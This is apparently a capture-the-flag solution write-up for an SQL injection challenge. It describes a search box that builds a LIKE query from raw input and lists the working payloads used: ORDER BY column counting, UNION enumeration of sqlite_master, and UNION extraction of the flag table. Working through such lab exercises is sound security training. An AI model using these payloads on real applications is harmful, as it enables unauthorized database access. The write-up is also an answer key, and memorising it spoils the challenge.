# Solution Writeup

1. **Vulnerability**: The search box injects input directly into the SQL query `SELECT name, description FROM products WHERE name LIKE '%{query}%'`.
2. **Column Count**: Use `' ORDER BY 2-- -` (Works), `' ORDER BY 3-- -` (Fails). The query returns 2 columns.
3. **Table Enumeration**: Payload `' UNION SELECT tbl_name, sql FROM sqlite_master-- -` reveals the `flag_store` table with column `flag`.
4. **Extraction**: Payload `' UNION SELECT 1, flag FROM flag_store-- -` extracts the flag into the results table.
